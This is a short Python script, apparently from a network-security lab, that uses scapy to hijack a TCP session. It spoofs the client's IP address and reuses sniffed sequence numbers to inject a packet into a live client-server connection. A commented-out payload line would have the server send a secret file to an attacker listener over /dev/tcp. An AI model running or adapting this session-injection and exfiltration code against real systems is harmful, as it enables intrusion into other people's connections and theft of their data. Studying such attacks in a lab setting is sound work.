#this script uses scapy (non interactive) to retrieve private information with
#   sniffed packets from wireshark. 

#import scapy library
from scapy.all import*

#tcp parameters
#gathered from last packet of client-server communication

#tcp = TCP(sport=56110, dport=7456, flags="AP", seq=2760269041, ack=1907560595)
tcp = TCP(sport=56110, dport=7456, flags="AP", seq=1907560606, ack=2760269041)

#IP source and destination address
#dest = server
#source = client (we are spoofing this, gathered from capture)

ip = IP(src="10.2.5.2", dst="10.2.5.3")

#following line gets text from secret file in server and sends it to attacklisten
#data = "\n cat /home/secret.txt > /dev/tcp/10.2.5.1/8040\n"
data = "This is the attacker speaking"

#connect everything into payload

packet = ip/tcp/data

#send

#ls(packet)
send(packet,verbose=0)
